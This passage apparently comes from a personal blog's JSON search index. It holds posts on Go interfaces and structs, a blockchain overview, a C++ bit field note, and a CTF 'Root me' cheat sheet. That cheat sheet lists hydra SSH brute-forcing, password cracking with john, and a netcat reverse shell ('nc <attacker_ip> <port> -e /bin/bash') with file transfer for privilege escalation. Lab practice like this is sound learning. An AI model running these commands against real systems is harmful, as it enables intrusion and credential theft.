Create() Read() Update(string) Delete(string) } func main() { sqldb := SQL{\u0026#34;table\u0026#34;} var db ORM = sqldb db.Create() db.Read() db.Update(\u0026#34;record\u0026#34;) db.Delete(\u0026#34;table\u0026#34;) } But you can notice that what if the operations were more than that ? We will get bunch of SQL member method ! We want to write \u0026ldquo;Clean Code\u0026rdquo;. We should follow the \u0026ldquo;Single-responsibility principle\u0026rdquo;(SRP) to design a more readable code. Struct SQL has deal with too many things ! We can try to make Create as a single struct, Read as a single struct. So each struct just do exactly one things. Let\u0026rsquo;s try the concept of inheritance\nInheritance in Golang :\npackage main import \u0026#34;fmt\u0026#34; type SQL struct { table string } type CreateSql struct { SQL } func (c CreateSql) Operate () { fmt.Println(\u0026#34;Create\u0026#34;) } type ReadSql struct { SQL } func (s ReadSql) Operate () { fmt.Println(\u0026#34;Read\u0026#34;) } type UpdateSql struct { SQL } func (s UpdateSql) Operate (criteria string) { fmt.Println(\u0026#34;Update\u0026#34;, criteria) } type DeleteSql struct { SQL } func (s DeleteSql) Operate (criteria string) { fmt.Println(\u0026#34;Delete\u0026#34;, criteria) } type ReadOnlyORM interface{ Operate() } type SideEffectORM interface{ Operate(string) } func main() { dbCreate := CreateSql{SQL{\u0026#34;table\u0026#34;}} dbRead := ReadSql{SQL{\u0026#34;table\u0026#34;}} dbUpdate := UpdateSql{SQL{\u0026#34;table\u0026#34;}} dbDelete := DeleteSql{SQL{\u0026#34;table\u0026#34;}} var read_only_orm ReadOnlyORM read_only_orm = dbCreate read_only_orm.Operate() read_only_orm = dbRead read_only_orm.Operate() var side_effect_orm SideEffectORM side_effect_orm = dbUpdate side_effect_orm.Operate(\u0026#34;test\u0026#34;) side_effect_orm = dbDelete side_effect_orm.Operate(\u0026#34;table\u0026#34;) } Now we make each struct just do only one thing. If Update operation has Bug, we can just modified UpdateSql struct without affecting other method.\nBut it seems like bringing owls to Athens for such little program. Maybe it is a good method, when the code is larger, not just 60 lines.\n","permalink":"https://BWbwchen.github.io/posts/gooop/","summary":"CRUD with clean code by using Go embed struct","title":"Go interface for inheritance"},{"content":"We can think of struct as a wrapper of object. You can also check Golang spec (struct).\ntype TestStruct struct { Interger int String string Bool bool SomeWeirdInterface interface{} OtherStruct // we call it embedded field } type OtherStruct struct { Hello string } We use Interface to group a set of method. You can think it as a list that all structs that have implemented the required method. If you missing one of the method, you can not in that interface.\nYou can also check Golang spec (interface).\ntype Human struct { name string } type Student struct { Human job string } type Worker struct { Human job string salary int } func (h Human) Info() { fmt.Printf(\u0026#34;I am %s\\n\u0026#34;, h.name) } func (s Student) Info () { fmt.Printf(\u0026#34;I am %s. I am a %s.\\n\u0026#34;, s.name, s.job) } func (w Worker) Info () { fmt.Printf(\u0026#34;I am %s. I am a %s. I have %d salary\\n\u0026#34;, w.name, w.job, w.salary) } type Person interface { Info() } with main function :\nfunc main() { Tom := Student{Human{\u0026#34;Tom\u0026#34;}, \u0026#34;student\u0026#34;} Ben := Worker{Human{\u0026#34;Ben\u0026#34;}, \u0026#34;worker\u0026#34;, 1000} Susan := Human{\u0026#34;Susan\u0026#34;} Tom.Info() Ben.Info() Susan.Info() var i Person // Becaus Student and Worker and Human all have implemented Info method  i = Tom i.Info() i = Ben i.Info() i = Susan i.Info() } We can see that Student, Worker, Human all have implemented the Info method, so the variabe i with type person interface will work well.\nI am Tom. I am a student. I am Ben. I am a worker. I have 1000 salary I am Susan I am Tom. I am a student. I am Ben. I am a worker. I have 1000 salary I am Susan But what if I change the Human method to Hi() ?\ncannot use Susan (type Human) as type Person in assignment: Human does not implement Person (missing Info method) ","permalink":"https://BWbwchen.github.io/posts/gostructinterface/","summary":"Struct wrap things, Interface make a member-required function list","title":"Go Struct and Interface"},{"content":"Block Chain Basic Chain for one block we record its :\n Index (the i th block in this chain) Timestamp Data The hash value of previous block Hash value of this block  Block Chain Network  accept imcoming data, and build a block broadcast the chain to all network within a time interval  Mining Algorithm - Proof of Work(used by Bitcoin) Algorithm ask the miner to done some \u0026ldquo;work\u0026rdquo;, and competed with other miners who were also do the same \u0026ldquo;work\u0026rdquo;.\nWork \u0026ldquo;Work\u0026rdquo; is all about cryptography and hashing.\nOne-way cryptography One-way cryptography take an input and applied it with a function to produce an indecipherable output. If you input the same data, the output of the crypto algorithm should give you the same output(idempotency).\n\u0026ldquo;Work\u0026rdquo; : participants hashed many combination of letters and numbers to produce the specific number of leading 0's.\nCheck whether you find the answer is easy, just hash it. So the winner miner can earn the bitcoin by proving you done the \u0026ldquo;work\u0026rdquo;. \u0026mdash;Proof-of-Work\nOf course, we can change the requirement of the numbers of leading 0\u0026rsquo;s dynamically to make sure the work won\u0026rsquo;t too easy. \u0026mdash;adjusting the difficulty\nimplementation Use Timestamp and all data in block to calculate hash to finish the work.\nMining Algorithm - Proof of Stake Proof of Work will consume lots of energy, as the difficulty of mining grows the higher energy it waste.\nWhat is \u0026ldquo;stake\u0026rdquo; meaning ? You can think word \u0026ldquo;stake\u0026rdquo; as how much money you have. In this mining algorithm, we pick winner base on miner\u0026rsquo;s money, the more money you have the higher possibility that you been picked.\nP2P Block Chain this website\nProblem Mining is on server ? or client ? decentralization ? ","permalink":"https://BWbwchen.github.io/posts/block_chain/","summary":"block chain tutorial","title":"Block chain"},{"content":"Root me  nmap the ip address  nmap -sC -sV \u0026lt;ip_addr\u0026gt; nikto to find vulnerability  nikto -h \u0026lt;url\u0026gt; gobuster to brute-force directory  gobuster dir -u \u0026lt;url\u0026gt; -w \u0026lt;wordlist\u0026gt; brute-force the ssh password : hydra  hydra -l \u0026lt;user_name\u0026gt; -P \u0026lt;word_list\u0026gt; \u0026lt;protocol\u0026gt;://\u0026lt;ip_addr\u0026gt; john the ripper  john \u0026lt;encrypted\u0026gt; --wordlist=\u0026lt;word_list\u0026gt; (--format=\u0026lt;format\u0026gt;) reverse shell  nc \u0026lt;attacker_ip\u0026gt; \u0026lt;port\u0026gt; -e /bin/bash # target machine nc -lvp \u0026lt;port\u0026gt; # attacker machine reverse shell send file (ex: send linpeas.sh)  nc -l -p \u0026lt;port\u0026gt; \u0026gt; \u0026lt;file\u0026gt; \u0026lt; /dev/null # target machine cat \u0026lt;file\u0026gt; | nc \u0026lt;target_ip\u0026gt; \u0026lt;port\u0026gt; # attacker machine linpeas.sh to find privilege escalation   gtfobins is good  ","permalink":"https://BWbwchen.github.io/posts/ctf_rootme_process/","summary":"Root me process","title":"CTF rootme process"},{"content":"C++ bit field When I reading the source code of gameboy-emulator, I saw this weird code.\nunsigned unused : 4; unsigned c : 1; /* Carry flag */ unsigned h : 1; /* Half carry flag */ unsigned n : 1; /* Add/sub flag */ unsigned z : 1; /* Zero flag */ The meaning of : It specifies the length in bits of each field.\nHere is an example :\n","permalink":"https://BWbwchen.github.io/posts/note/bit_field/","summary":"C++ bit field usage","title":"C++ bit field"}]